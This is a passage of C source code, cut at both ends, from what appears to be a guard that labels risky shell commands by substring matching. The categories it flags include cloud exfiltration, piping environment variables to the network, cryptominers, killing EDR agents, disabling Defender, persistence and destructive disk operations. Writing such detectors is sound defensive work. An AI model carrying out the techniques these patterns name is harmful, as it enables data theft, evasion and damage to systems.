        } else if (ci_contains(text, "rclone") &&
                   (ci_contains(text, "copy") || ci_contains(text, " move") ||
                    ci_contains(text, "sync") || ci_contains(text, "lsd"))) {
            what = "rclone cloud exfil";
        } else if (ci_contains(text, "aws") && ci_contains(text, "s3") &&
                   (ci_contains(text, " cp") || ci_contains(text, " sync") ||
                    ci_contains(text, " mv") || ci_contains(text, " rm"))) {
            what = "aws s3 exfil";
        } else if (ci_contains(text, "aws") && ci_contains(text, "ssm") &&
                   (ci_contains(text, "send-command") ||
                    ci_contains(text, "start-session"))) {
            what = "aws ssm remote exec";
        } else if (ci_contains(text, "gsutil") &&
                   (ci_contains(text, " cp") || ci_contains(text, " rsync") ||
                    ci_contains(text, " mv"))) {
            what = "gsutil cloud exfil";
        } else if (ci_contains(text, "azcopy") &&
                   (ci_contains(text, " copy") || ci_contains(text, " sync"))) {
            what = "azcopy cloud exfil";
        } else if (ci_contains(text, "az ") &&
                   (ci_contains(text, "run-command") ||
                    (ci_contains(text, "storage") &&
                     (ci_contains(text, "upload") || ci_contains(text, "download") ||
                      ci_contains(text, " copy"))))) {
            what = "az storage exfil/run-command";
        } else if (ci_contains(text, "gcloud") &&
                   (ci_contains(text, "compute ssh") ||
                    ci_contains(text, "compute scp"))) {
            what = "gcloud compute ssh/scp";
        /* ── k8s / container exec ── */
        } else if (ci_contains(text, "kubectl") &&
                   (ci_contains(text, " exec") || ci_contains(text, " cp ") ||
                    ci_contains(text, " port-forward") || ci_contains(text, " apply") ||
                    ci_contains(text, " attach") || ci_contains(text, " run "))) {
            what = "kubectl exec/apply";
        } else if (ci_contains(text, "helm") &&
                   (ci_contains(text, " install") || ci_contains(text, " upgrade"))) {
            what = "helm install/upgrade";
        } else if ((ci_contains(text, "docker") || ci_contains(text, "podman") ||
                    ci_contains(text, "nerdctl")) &&
                   (ci_contains(text, " exec") || ci_contains(text, " cp "))) {
            what = "container exec/cp";
        } else if (ci_contains(text, "crictl") && ci_contains(text, " exec")) {
            what = "crictl exec";
        /* ── db query exec / redis abuse ── */
        } else if (ci_contains(text, "mysql") && ci_contains(text, "-e ")) {
            what = "mysql -e query exec";
        } else if (ci_contains(text, "psql") && ci_contains(text, "-c ")) {
            what = "psql -c query exec";
        } else if (ci_contains(text, "redis-cli") &&
                   (ci_contains(text, "config") || ci_contains(text, "eval") ||
                    ci_contains(text, "slaveof") || ci_contains(text, "replicaof") ||
                    ci_contains(text, "module load"))) {
            what = "redis-cli abuse";
        } else if ((ci_contains(text, "mongosh") || ci_contains(text, "mongo ")) &&
                   ci_contains(text, "--eval")) {
            what = "mongo eval exec";
        /* ── package-manager remote installs — install IS exec ──
         * the non-registry-source form (URL/git+/local-bundle) is
         * the deliverable: postinstall hooks, setup.py, or maint
         * scripts run the attacker's bytes                  */
        } else if ((((ci_contains(text, "npm") || ci_contains(text, "pnpm")) &&
                    (ci_contains(text, " install ") || ci_contains(text, " add ") ||
                     ci_contains(text, " i "))) ||
                   ci_contains(text, "yarn add ") || ci_contains(text, "yarn install ") ||
                   ci_contains(text, "bun add ") || ci_contains(text, "bun install ")) &&
                   (ci_contains(text, "http") || ci_contains(text, "git+") ||
                    ci_contains(text, "file:") || ci_contains(text, ".tgz") ||
                    ci_contains(text, ".tar") || ci_contains(text, ".zip"))) {
            what = "npm-family remote package install";
        } else if ((ci_contains(text, "pip ") || ci_contains(text, "pip3") ||
                    ci_contains(text, "pipx") || ci_contains(text, "poetry add ") ||
                    ci_contains(text, "poetry install ")) &&
                   (ci_contains(text, " install ") || ci_contains(text, " add ") ||
                    (ci_contains(text, " -r ") && ci_contains(text, "http"))) &&
                   (ci_contains(text, "http") || ci_contains(text, "git+") ||
                    ci_contains(text, ".whl") || ci_contains(text, ".zip") ||
                    ci_contains(text, ".tar"))) {
            what = "python remote package install";
        } else if ((ci_contains(text, "uvx") &&
                    ci_contains(text, "http")) ||
                   (ci_contains(text, "gem install ") &&
                    (ci_contains(text, "http") || ci_contains(text, ".gem"))) ||
                   (ci_contains(text, "cargo install ") &&
                    (ci_contains(text, "--git") || ci_contains(text, "http") ||
                     ci_contains(text, "--path"))) ||
                   (ci_contains(text, "composer") &&
                    ci_contains(text, " require ") && ci_contains(text, "http"))) {
            what = "remote package install/exec";
        /* ── OS package remote/local-bundle installs ── */
        } else if ((ci_contains(text, "apt") || ci_contains(text, "apt-get")) &&
                   ci_contains(text, " install ") &&
                   (ci_contains(text, ".deb") || ci_contains(text, "http"))) {
            what = "apt bundle/URL install";
        } else if (ci_contains(text, "dpkg") && ci_contains(text, "-i ") &&
                   ci_contains(text, ".deb")) {
            what = "dpkg bundle install";
        } else if (((ci_contains(text, "rpm") &&
                    (ci_contains(text, " -i") || ci_contains(text, " -u"))) ||
                   (ci_contains(text, "dnf") && ci_contains(text, " install ")) ||
                   (ci_contains(text, "yum") && ci_contains(text, " install ")) ||
                   (ci_contains(text, "zypper") && ci_contains(text, " install ")) ||
                   (ci_contains(text, "pacman") && ci_contains(text, " -u ")) ||
                   (ci_contains(text, "xbps-install")) ||
                   (ci_contains(text, "brew") && ci_contains(text, " install ")) ||
                   (ci_contains(text, "winget") && ci_contains(text, " install ")) ||
                   (ci_contains(text, "choco") && ci_contains(text, " install ")) ||
                   (ci_contains(text, "scoop") && ci_contains(text, " install "))) &&
                   ci_contains(text, "http")) {
            what = "remote OS package install";
        } else if ((ci_contains(text, "apk") && ci_contains(text, " add ") &&
                   (ci_contains(text, "http") ||
                    ci_contains(text, "--allow-untrusted"))) ||
                   (ci_contains(text, "snap") && ci_contains(text, " install ") &&
                    (ci_contains(text, ".snap") ||
                     ci_contains(text, "--dangerous"))) ||
                   (ci_contains(text, "flatpak") && ci_contains(text, " install ") &&
                    (ci_contains(text, "http") || ci_contains(text, ".flatpakref") ||
                     ci_contains(text, ".flatpak"))) ||
                   (ci_contains(text, "choco") && ci_contains(text, " install ") &&
                    ci_contains(text, ".nupkg"))) {
            what = "remote/bundle package install";
        /* ── config-management remote exec — pull/exec primitives ── */
        } else if (ci_contains(text, "ansible-pull") &&
                   ci_contains(text, "http")) {
            what = "ansible-pull playbook fetch+run";
        } else if ((ci_contains(text, "ansible-playbook") &&
                    ci_contains(text, "http")) ||
                   (ci_contains(text, "ansible-galaxy") &&
                    ci_contains(text, " install ") &&
                    (ci_contains(text, "http") || ci_contains(text, " -r ")))) {
            what = "ansible remote playbook install";
        } else if ((ci_contains(text, "ansible") &&
                    (ci_contains(text, " -m shell") ||
                     ci_contains(text, " -m command") ||
                     ci_contains(text, " -m raw"))) ||
                   (ci_contains(text, "salt") &&
                    (ci_contains(text, "cmd.run") || ci_contains(text, "cmd.shell") ||
                     ci_contains(text, "cmd.exec_code"))) ||
                   (ci_contains(text, "salt-call") && ci_contains(text, "cmd"))) {
            what = "remote ad-hoc command exec";
        /* ── c234: miner exec / terminal injection / agent kill /
         * env exfil / winrm / timestomp / misc residuals ── */
        } else if (ci_contains(text, "xmrig") || ci_contains(text, "minerd") ||
                   ci_contains(text, "cpuminer") || ci_contains(text, "xmr-stak") ||
                   ci_contains(text, "ethminer") || ci_contains(text, "bzminer") ||
                   ci_contains(text, "lolminer") || ci_contains(text, "phoenixminer") ||
                   ci_contains(text, "nanominer") || ci_contains(text, "gminer") ||
                   ci_contains(text, "teamredminer") || ci_contains(text, "nbminer") ||
                   ci_contains(text, "cgminer") || ci_contains(text, "sgminer") ||
                   ci_contains(text, "bfgminer") || ci_contains(text, "minerd") ||
                   ci_contains(text, "claymore -o") || ci_contains(text, "claymore.exe") ||
                   ci_contains(text, "trex miner") ||
                   ci_contains(text, "stratum+") || ci_contains(text, "stratum:") ||
                   ci_contains(text, "donate-level") ||
                   ci_contains(text, "nicehash") || ci_contains(text, "nanopool") ||
                   ci_contains(text, "supportxmr") || ci_contains(text, "minergate") ||
                   ci_contains(text, "f2pool") || ci_contains(text, "antpool") ||
                   ci_contains(text, "viabtc") || ci_contains(text, "2miners") ||
                   ci_contains(text, "flypool") || ci_contains(text, "herominers") ||
                   ci_contains(text, "unmineable") || ci_contains(text, "miningpool")) {
            what = "cryptominer exec / pool config";
        } else if (ci_contains(text, "tmux send-keys") ||
                   ci_contains(text, "send-keys ") ||
                   (ci_contains(text, "screen") &&
                    ci_contains(text, "-x stuff"))) {
            what = "terminal session injection";
        } else if ((ci_contains(text, "pkill") || ci_contains(text, "killall") ||
                    ci_contains(text, "kill -9")) &&
                   (ci_contains(text, "osquery") || ci_contains(text, "filebeat") ||
                    ci_contains(text, "datadog-agent") || ci_contains(text, "fluentd") ||
                    ci_contains(text, "fluent-bit") || ci_contains(text, "splunk") ||
                    ci_contains(text, "newrelic") || ci_contains(text, "telegraf") ||
                    ci_contains(text, "wazuh") || ci_contains(text, "auditbeat") ||
                    ci_contains(text, "metricbeat") || ci_contains(text, "packetbeat") ||
                    ci_contains(text, "qualys") || ci_contains(text, "rapid7") ||
                    ci_contains(text, "insight-agent") || ci_contains(text, "sysmon") ||
                    ci_contains(text, "velociraptor") || ci_contains(text, "falcon") ||
                    ci_contains(text, "sentinel") || ci_contains(text, "elastic-agent"))) {
            what = "monitoring/EDR agent kill";
        } else if ((strstr(text, "env |") || strstr(text, "env|") ||
                    strstr(text, "printenv") || strstr(text, "env >") ||
                    strstr(text, "printenv >")) &&
                   (strstr(text, "| nc") || strstr(text, "|nc") ||
                    strstr(text, "nc ") || strstr(text, "| curl") ||
                    strstr(text, "|curl") || strstr(text, "curl -F") ||
                    strstr(text, "curl -d") || strstr(text, "wget --post") ||
                    strstr(text, "| wget") || strstr(text, "| socat"))) {
            what = "env-var dump piped to network (secrets exfil)";
        } else if (strstr(text, "| sudo -S") || strstr(text, "|sudo -S") ||
                   strstr(text, "| su -") || strstr(text, "|su -") ||
                   strstr(text, "su -c ")) {
            what = "stdin-password / su exec pipe";
        } else if ((ci_contains(text, "docker.sock") &&
                    (ci_contains(text, " -v ") || ci_contains(text, "--volume"))) ||
                   (ci_contains(text, "docker") &&
                    ci_contains(text, "--socket"))) {
            what = "docker socket mount (host control)";
        } else if (ci_contains(text, "credential.helper") &&
                   (ci_contains(text, "store") || ci_contains(text, "get") ||
                    ci_contains(text, "!"))) {
            what = "git credential.helper theft config";
        } else if (((ci_contains(text, "enter-pssession") ||
                    ci_contains(text, "new-pssession") ||
                    ci_contains(text, "invoke-command") ||
                    ci_contains(text, "invoke-wmimethod") ||
                    ci_contains(text, "invoke-cimmethod")) &&
                   (ci_contains(text, "-computername") ||
                    ci_contains(text, "-computer ") || ci_contains(text, "-cn "))) ||
                  (ci_contains(text, "winrm") &&
                   ci_contains(text, "quickconfig"))) {
            what = "WinRM / PSRemoting remote exec";
        } else if (ci_contains(text, "touch") &&
                   (ci_contains(text, " -r") || ci_contains(text, " -t") ||
                    ci_contains(text, " -d") || ci_contains(text, "--reference"))) {
            what = "timestomp (anti-forensic timestamp)";
        } else if (ci_contains(text, "batch -f") || ci_contains(text, "| batch") ||
                   ci_contains(text, "|batch")) {
            what = "batch (at-family) queued exec";
        /* ── c235: interpreter -e+exec-verb / npx-URL / git upload-pack /
         * exec -a / setcap+setfacl / netns+setpriv / misc ── */
        } else if ((ci_contains(text, "node -e") || ci_contains(text, "nodejs -e") ||
                    ci_contains(text, "node --eval") || ci_contains(text, "python -c") ||
                    ci_contains(text, "python2 -c") || ci_contains(text, "python3 -c") ||
                    ci_contains(text, "perl -e") || ci_contains(text, "ruby -e") ||
                    ci_contains(text, "php -r") || ci_contains(text, "lua -e") ||
                    ci_contains(text, "luajit -e") || ci_contains(text, "gawk -e") ||
                    ci_contains(text, "rscript -e") || ci_contains(text, "pwsh -c")) &&
                   (ci_contains(text, "child_process") || ci_contains(text, "os.system") ||
                    ci_contains(text, "subprocess") || ci_contains(text, "os.popen") ||
                    ci_contains(text, "pty.spawn") || ci_contains(text, "system(") ||
                    ci_contains(text, "exec(") || ci_contains(text, "popen(") ||
                    ci_contains(text, "spawn") || ci_contains(text, "shell_exec") ||
                    ci_contains(text, "passthru(") || ci_contains(text, "getruntime") ||
                    ci_contains(text, "os.execute") || ci_contains(text, "eval(") ||
                    ci_contains(text, "commands.getoutput") || ci_contains(text, "loadstring"))) {
            what = "interpreter -e/-c inline exec";
        } else if ((ci_contains(text, "npx") || ci_contains(text, "pnpm dlx") ||
                    ci_contains(text, "bunx") || ci_contains(text, "yarn dlx")) &&
                   (ci_contains(text, "http") || ci_contains(text, "git+"))) {
            what = "npx-family remote package exec";
        } else if (ci_contains(text, "git clone") &&
                   (ci_contains(text, "--upload-pack") || ci_contains(text, " -u "))) {
            what = "git clone upload-pack exec";
        } else if (ci_contains(text, "exec -a")) {
            what = "argv0 masquerade (exec -a)";
        } else if (ci_contains(text, "setcap") &&
                   (ci_contains(text, "+ep") || ci_contains(text, "+ei"))) {
            what = "file-capability grant (setcap)";
        } else if (ci_contains(text, "setfacl") &&
                   ci_contains(text, " -m") &&
                   (ci_contains(text, "/etc/") || ci_contains(text, "/root"))) {
            what = "acl grant on system file (setfacl)";
        } else if (ci_contains(text, "swapoff -") ||
                   ci_contains(text, "swapoff /")) {
            what = "swap disable (ransomware-prep class)";
        } else if (ci_contains(text, "ip netns exec") ||
                   ci_contains(text, "netns exec") ||
                   (ci_contains(text, "setpriv") &&
                    (ci_contains(text, "--reuid") || ci_contains(text, "--inh-caps") ||
                     ci_contains(text, "--bounding-set") || ci_contains(text, "--ruid") ||
                     ci_contains(text, "--euid")))) {
            what = "namespace / privilege-context exec";
        } else if (ci_contains(text, "bwrap") &&
                   (ci_contains(text, "--bind") || ci_contains(text, "--dev-bind") ||
                    ci_contains(text, "--ro-bind"))) {
            what = "bwrap bind-mount (namespace escape)";
        } else if (ci_contains(text, "emacs") &&
                   (ci_contains(text, " -l ") || ci_contains(text, "--eval") ||
                    ci_contains(text, "-batch"))) {
            what = "emacs batch/elisp exec";
        } else if (ci_contains(text, "sed") &&
                   (ci_contains(text, "1e ") || ci_contains(text, "1e'") ||
                    ci_contains(text, "1e\"") || ci_contains(text, " e ") ||
                    ci_contains(text, " e'"))) {
            what = "sed e-flag exec";
        } else if (ci_contains(text, "rsync") && ci_contains(text, "--rsh")) {
            what = "rsync remote-shell exec";
        } else if ((ci_contains(text, "update-rc.d") || ci_contains(text, "chkconfig") ||
                    ci_contains(text, "rc-update")) &&
                   (ci_contains(text, " defaults") || ci_contains(text, " on") ||
                    ci_contains(text, " add") || ci_contains(text, " enable"))) {
            what = "sysvinit service enable";
        /* ── c236: env-var injection (loader/interpreter/vcs/shell/proxy/
         * path hijack) + lateral movement (remote schtasks/sc/reg/at,
         * admin shares) + Defender exclusions + cred-enumeration ── */
        } else if (ci_contains(text, "ld_preload=") ||
                   ci_contains(text, "ld_library_path=") ||
                   ci_contains(text, "dyld_insert_libraries=") ||
                   ci_contains(text, "dyld_fallback") ||
                   ci_contains(text, "ld_audit=") ||
                   ci_contains(text, "ld_profile=") ||
                   ci_contains(text, "gconv_path=") ||
                   ci_contains(text, "glibc_tunables=") ||
                   ci_contains(text, "node_options=") ||
                   ci_contains(text, "pythonpath=") ||
                   ci_contains(text, "pythonhome=") ||
                   ci_contains(text, "pythonstartup=") ||
                   ci_contains(text, "rubylib=") ||
                   ci_contains(text, "rubyopt=") ||
                   ci_contains(text, "perl5opt=") ||
                   ci_contains(text, "perl5lib=") ||
                   ci_contains(text, "perl5db=") ||
                   ci_contains(text, "java_tool_options=") ||
                   ci_contains(text, "_java_options=") ||
                   ci_contains(text, "jdk_java_options=") ||
                   ci_contains(text, "phprc=") ||
                   ci_contains(text, "php_ini_scan_dir=") ||
                   ci_contains(text, "gem_home=") ||
                   ci_contains(text, "gem_path=") ||
                   ci_contains(text, "git_ssh_command=") ||
                   ci_contains(text, "git_ssh=") ||
                   ci_contains(text, "git_proxy_command=") ||
                   ci_contains(text, "git_external_diff=") ||
                   ci_contains(text, "git_askpass=") ||
                   ci_contains(text, "ssh_askpass=") ||
                   ci_contains(text, "svn_ssh=") ||
                   ci_contains(text, "cvs_rsh=") ||
                   ci_contains(text, "prompt_command=") ||
                   ci_contains(text, "bash_env=") ||
                   ci_contains(text, "zdotdir=") ||
                   ci_contains(text, "inputrc=") ||
                   ci_contains(text, "http_proxy=") ||
                   ci_contains(text, "https_proxy=") ||
                   ci_contains(text, "all_proxy=") ||
                   ci_contains(text, "ftp_proxy=") ||
                   ci_contains(text, "rsync_proxy=") ||
                   ci_contains(text, "path=/tmp") ||
                   ci_contains(text, "path=/dev/shm") ||
                   ci_contains(text, "path=/var/tmp") ||
                   ci_contains(text, "path=.") ||
                   ci_contains(text, "path=/usr/tmp")) {
            what = "env-var injection (loader/interpreter/proxy/path hijack)";
        } else if ((ci_contains(text, "schtasks") &&
                    (ci_contains(text, " /s ") || ci_contains(text, " /s\\"))) ||
                   ci_contains(text, "sc \\") || ci_contains(text, "sc.exe \\") ||
                   ci_contains(text, "reg add \\") ||
                   ci_contains(text, "at \\")) {
            what = "remote admin primitive (schtasks/sc/reg/at \\host)";
        } else if (strstr(text, "\\\\") &&
                   (strstr(text, "\\c$") || strstr(text, "\\d$") ||
                    strstr(text, "\\admin$") || strstr(text, "\\ipc$") ||
                    strstr(text, "\\print$"))) {
            what = "admin-share path (\\\\host\\c$/admin$/ipc$)";
        } else if (ci_contains(text, "add-mppreference") ||
                   ci_contains(text, "set-mppreference") ||
                   ci_contains(text, "-exclusionpath") ||
                   ci_contains(text, "-exclusionprocess") ||
                   ci_contains(text, "-exclusionextension") ||
                   ci_contains(text, "-disablerealtimemonitoring") ||
                   ci_contains(text, "-disableioavprotection") ||
                   ci_contains(text, "-disablebehaviormonitoring") ||
                   ci_contains(text, "-disablescriptscanning") ||
                   ci_contains(text, "-disableblockatfirstseen") ||
                   ci_contains(text, "-disabletamperprotection") ||
                   ci_contains(text, "-disablearchive") ||
                   ci_contains(text, "-disableemailscanning") ||
                   ci_contains(text, "-disablenetworkprotection")) {
            what = "Defender exclusion/disable (AV weakening)";
        } else if (ci_contains(text, "vaultcmd") ||
                   ci_contains(text, "keymgr") ||
                   (ci_contains(text, "netsh wlan") &&
                    (ci_contains(text, "key") || ci_contains(text, "export")))) {
            what = "credential-store enumeration";
        } else if (ci_contains(text, "explorer") &&
                   (ci_contains(text, "http") || ci_contains(text, "shell:") ||
                    strstr(text, "\\\\"))) {
            what = "explorer remote-open (URL/shell:/UNC)";
        } else if ((ci_contains(text, "start-process") &&
                    ci_contains(text, "-verb runas")) ||
                   ci_contains(text, "runas /netonly")) {
            what = "runas/elevation attempt";
        } else if (ci_contains(text, "fsutil") &&
                   (ci_contains(text, "setzerodata") ||
                    ci_contains(text, "setvaliddata") ||
                    ci_contains(text, "behavior set"))) {
            what = "fsutil data-wipe/behavior change";
        } else if (ci_contains(text, "diskpart") &&
                   (ci_contains(text, "clean") || ci_contains(text, "create") ||
                    ci_contains(text, "format") || ci_contains(text, "select disk"))) {
            what = "diskpart partition destructive op";
        /* ── c237: PowerShell cmdlets (in-memory load, persistence,
         * accounts, remoting, install, policy-bypass, MOTW strip) +
         * audit/anti-forensics + destructive Windows + sudo/key ops ── */
        } else if (ci_contains(text, "add-type") ||
                   ci_contains(text, "assembly]::load") ||
                   ci_contains(text, "assembly.load") ||
                   ci_contains(text, "loadwithpartialname") ||
                   ci_contains(text, "assembly]::loadfrom") ||
                   ci_contains(text, "assembly]::loadfile")) {
            what = "PowerShell/.NET in-memory assembly load";
        } else if ((ci_contains(text, "new-service") &&
                    ci_contains(text, "-binarypathname")) ||
                   ci_contains(text, "register-scheduledtask") ||
                   ci_contains(text, "new-scheduledtask") ||
                   ci_contains(text, "set-scheduledtask") ||
                   ((ci_contains(text, "new-itemproperty") ||
                     ci_contains(text, "set-itemproperty") ||
                     ci_contains(text, "new-item")) &&
                    (ci_contains(text, "\\run") || ci_contains(text, "runonce") ||
                     ci_contains(text, "\\ifeo") || ci_contains(text, "winlogon") ||
                     ci_contains(text, "image file") || ci_contains(text, "shell\\")))) {
            what = "PowerShell persistence install (service/task/runkey)";
        } else if (ci_contains(text, "set-executionpolicy") &&
                   (ci_contains(text, "bypass") || ci_contains(text, "unrestricted"))) {
            what = "execution-policy bypass (cmdlet form)";
        } else if (ci_contains(text, "unblock-file") ||
                   (ci_contains(text, "zone.identifier") &&
                    (ci_contains(text, "remove") || ci_contains(text, "del") ||
                     ci_contains(text, "clear")))) {
            what = "MOTW strip (Unblock-File/Zone.Identifier removal)";
        } else if (ci_contains(text, "new-localuser") ||
                   ci_contains(text, "add-localgroupmember") ||
                   ci_contains(text, "enable-localuser") ||
                   (ci_contains(text, "set-localuser") &&
                    ci_contains(text, "-password")) ||
                   ci_contains(text, "new-aduser") ||
                   ci_contains(text, "add-adgroupmember") ||
                   ci_contains(text, "set-adaccountpassword")) {
            what = "account creation/group grant (PowerShell)";
        } else if (ci_contains(text, "enable-psremoting") ||
                   ci_contains(text, "enable-wsmancredssp") ||
                   ci_contains(text, "install-module") ||
                   ci_contains(text, "install-package") ||
                   ci_contains(text, "install-script") ||
                   ((ci_contains(text, "add-windowscapability") ||
                     ci_contains(text, "enable-windowsoptionalfeature")) &&
                    (ci_contains(text, "telnet") || ci_contains(text, "smb1") ||
                     ci_contains(text, "snmp") || ci_contains(text, "tftp")))) {
            what = "PS remoting/gallery-install/legacy-feature enable";
        } else if (ci_contains(text, "auditpol") &&
                   (ci_contains(text, "/clear") || ci_contains(text, "/remove") ||
                    ci_contains(text, "/set") || ci_contains(text, "/backup"))) {
            what = "audit-policy wipe (auditpol)";
        } else if (ci_contains(text, "shutdown") &&
                   (ci_contains(text, " /s") || ci_contains(text, " /r") ||
                    ci_contains(text, " /m") || ci_contains(text, " /p") ||
                    ci_contains(text, " -s") || ci_contains(text, " -r"))) {
            what = "shutdown/reboot (local or remote)";
        } else if ((ci_contains(text, "format") &&
                    (ci_contains(text, " c:") || ci_contains(text, " d:") ||
                     ci_contains(text, " e:") || ci_contains(text, " f:") ||
                     ci_contains(text, " /q") || ci_contains(text, " /y"))) ||
                   ci_contains(text, "format.com") ||
                   ci_contains(text, "del /s") || ci_contains(text, "del /f /s") ||
                   ci_contains(text, "rmdir /s") || ci_contains(text, "rd /s")) {
            what = "format/recursive-delete (Windows destructive)";
        } else if (ci_contains(text, "attrib ") &&
                   (ci_contains(text, "+h") || ci_contains(text, "+s") ||
                    ci_contains(text, " -h") || ci_contains(text, " -s"))) {
            what = "attrib hidden/system flag (evasion)";
        } else if ((ci_contains(text, "net config") &&
                    ci_contains(text, "/hidden")) ||
                   (ci_contains(text, "netsh") &&
                    (ci_contains(text, " -r ") || ci_contains(text, " -f ")))) {
            what = "hidden-server flag / remote or scripted netsh";
        } else if ((ci_contains(text, "klist") &&
                    (ci_contains(text, "purge") || ci_contains(text, "get"))) ||
                   ci_contains(text, "sudoedit") ||
                   ci_contains(text, "sudo -e") ||
                   (ci_contains(text, "net time") &&
                    ci_contains(text, "/set"))) {
            what = "ticket/sudo-edit/time-set primitive";
        } else if (ci_contains(text, "get-credential") ||
                   ci_contains(text, "convertfrom-securestring") ||
                   ci_contains(text, "convertto-securestring") ||
                   ci_contains(text, "export-clixml") ||
                   ci_contains(text, "import-clixml")) {
            what = "credential materialization (PS cred cmdlets)";
        } else if (ci_contains(text, "gpg --export-secret") ||
                   (ci_contains(text, "pkcs12") && ci_contains(text, "-export")) ||
                   ci_contains(text, "ssh-keygen -y") ||
                   ci_contains(text, "keytool -exportcert") ||
                   ci_contains(text, "keytool -genkey") ||
                   ci_contains(text, "makecert") ||
                   ci_contains(text, "new-selfsignedcertificate") ||
                   ci_contains(text, "iam create-access-key") ||
                   (ci_contains(text, "aws configure set") &&
                    (ci_contains(text, "access") || ci_contains(text, "secret")))) {
            what = "key-material export/creation";
        } else if ((ci_contains(text, "puppet") && ci_contains(text, " apply ") &&
                    ci_contains(text, "http")) ||
                   ((ci_contains(text, "chef-client") ||
                     ci_contains(text, "chef-solo")) &&
                    ci_contains(text, " -r ") && ci_contains(text, "http")) ||
                   (ci_contains(text, "make") && ci_contains(text, " -f ") &&
                    ci_contains(text, "http")) ||
                   ci_contains(text, "at -f ")) {
            what = "remote recipe/makefile exec";
        /* ── c238: systemctl/service/runlevel control + account mgmt +
         * firewall rule-add + sysctl security keys + kernel-module
         * load + boot/store-config + sniff/spoof tools ── */
        } else if (ci_contains(text, "systemctl") &&
                   (ci_contains(text, " stop") || ci_contains(text, " disable") ||
                    ci_contains(text, " mask") || ci_contains(text, " kill") ||
                    ci_contains(text, " halt") || ci_contains(text, " poweroff") ||
                    ci_contains(text, " reboot") || ci_contains(text, " kexec") ||
                    ci_contains(text, " suspend") || ci_contains(text, " hibernate") ||
                    ci_contains(text, " emergency") || ci_contains(text, " rescue") ||
                    ci_contains(text, " isolate") || ci_contains(text, " restart"))) {
            what = "systemctl stop/mask/shutdown verb";
        } else if ((ci_contains(text, "service ") &&
                    (ci_contains(text, " stop") || ci_contains(text, " start") ||
                     ci_contains(text, " restart") || ci_contains(text, " disable"))) ||
                   (ci_contains(text, "loginctl") &&
                    (ci_contains(text, "poweroff") || ci_contains(text, "reboot") ||
                     ci_contains(text, "suspend") || ci_contains(text, "hibernate") ||
                     ci_contains(text, "halt") || ci_contains(text, "kill") ||
                     ci_contains(text, "terminate"))) ||
                   (ci_contains(text, "busybox") &&
                    (ci_contains(text, "poweroff") || ci_contains(text, "halt") ||
                     ci_contains(text, "reboot"))) ||
                   ci_contains(text, "init 1") || ci_contains(text, "init s") ||
                   ci_contains(text, "init s") || ci_contains(text, "telinit 1") ||
                   ci_contains(text, "telinit s") || ci_contains(text, "telinit s") ||
                   ci_contains(text, "reboot -") || ci_contains(text, "reboot now") ||
                   ci_contains(text, "poweroff -") || ci_contains(text, "halt -") ||
                   (ci_contains(text, "shutdown") &&
                    (ci_contains(text, " -h") || ci_contains(text, " -h") ||
                     ci_contains(text, " -p") || ci_contains(text, " -r")))) {
            what = "service/runlevel/power primitive";
        } else if (ci_contains(text, "userdel ") || ci_contains(text, "groupdel ") ||
                   (ci_contains(text, "gpasswd") &&
                    (ci_contains(text, " -a") || ci_contains(text, " -d") ||
                     ci_contains(text, " -a") || ci_contains(text, " -m"))) ||
                   (ci_contains(text, "usermod") &&
                    (ci_contains(text, " -p") || ci_contains(text, " -l") ||
                     ci_contains(text, " -u") || ci_contains(text, " -s"))) ||
                   (ci_contains(text, "passwd") &&
                    (ci_contains(text, " -d") || ci_contains(text, " -u") ||
                     ci_contains(text, " -e"))) ||
                   (ci_contains(text, "faillock") &&
                    ci_contains(text, "--reset")) ||
                   (ci_contains(text, "pam_tally2") &&
                    (ci_contains(text, "--reset") || ci_contains(text, " -r"))) ||
                   (ci_contains(text, "faillog") && ci_contains(text, " -r")) ||
                   (ci_contains(text, "lastlog") &&
                    (ci_contains(text, "clear") || ci_contains(text, " -r"))) ||
                   (ci_contains(text, "chage") &&
                    (ci_contains(text, "-m -1") || ci_contains(text, "-m 0") ||
                     ci_contains(text, "-e -1") || ci_contains(text, "-e 0") ||
                     ci_contains(text, "-i -1") || ci_contains(text, "-i 0")))) {
            what = "account-create/password/lockout-reset";
        } else if (((ci_contains(text, "iptables") ||
                     ci_contains(text, "ip6tables")) &&
                    ci_contains(text, "--policy")) ||
                   (ci_contains(text, "ufw") &&
                    ci_contains(text, "default allow"))) {
            what = "firewall default-policy neutralize";
        } else if (ci_contains(text, "sysctl") &&
                   (ci_contains(text, " -w") || ci_contains(text, "=")) &&
                   (ci_contains(text, "randomize_va_space") ||
                    ci_contains(text, "core_pattern") ||
                    ci_contains(text, "suid_dumpable") ||
                    ci_contains(text, "kptr_restrict") ||
                    ci_contains(text, "dmesg_restrict") ||
                    ci_contains(text, "yama") ||
                    ci_contains(text, "modules_disabled") ||
                    ci_contains(text, "kexec_load") ||
                    ci_contains(text, "unprivileged_bpf") ||
                    ci_contains(text, "unprivileged_userns") ||
                    ci_contains(text, "uselib") ||
                    ci_contains(text, "perf_event_paranoid") ||
                    ci_contains(text, "accept_redirects") ||
                    ci_contains(text, "accept_source_route") ||
                    ci_contains(text, "send_redirects") ||
                    ci_contains(text, "rp_filter") ||
                    ci_contains(text, "tcp_syncookies") ||
                    ci_contains(text, "icmp_echo_ignore") ||
                    ci_contains(text, "log_martians") ||
                    ci_contains(text, "mmap_min_addr") ||
                    ci_contains(text, "protected_hardlinks") ||
                    ci_contains(text, "protected_symlinks") ||
                    ci_contains(text, "protected_fifos") ||
                    ci_contains(text, "protected_regular") ||
                    ci_contains(text, "kernel.sysrq"))) {
            what = "sysctl security-parameter write";
        } else if ((ci_contains(text, "modprobe") &&
                    (ci_contains(text, " /") || ci_contains(text, "--force") ||
                     ci_contains(text, " -f "))) ||
                   (ci_contains(text, "dkms") &&
                    (ci_contains(text, "install") || ci_contains(text, "add")))) {
            what = "kernel-module load (modprobe/dkms)";
        } else if ((ci_contains(text, "ldconfig") &&
                    (ci_contains(text, " /") || ci_contains(text, " -n "))) ||
                   ci_contains(text, "ssh-copy-id") ||
                   (ci_contains(text, "ssh-add") &&
                    (ci_contains(text, " /") || ci_contains(text, "~/") ||
                     ci_contains(text, " -d"))) ||
                   (ci_contains(text, "apt-key") && ci_contains(text, "add")) ||
                   (ci_contains(text, "rpm") && ci_contains(text, "--import"))) {
            what = "ldconfig/ssh-key/trust-store primitive";
        } else if ((ci_contains(text, "mokutil") &&
                    (ci_contains(text, "--disable") || ci_contains(text, "--import") ||
                     ci_contains(text, " -i "))) ||
                   (ci_contains(text, "efibootmgr") &&
                    (ci_contains(text, " -c") || ci_contains(text, " -b") ||
                     ci_contains(text, " -d") || ci_contains(text, " -b"))) ||
                   (ci_contains(text, "efivar") && ci_contains(text, " -w")) ||
                   (ci_contains(text, "update-alternatives") &&
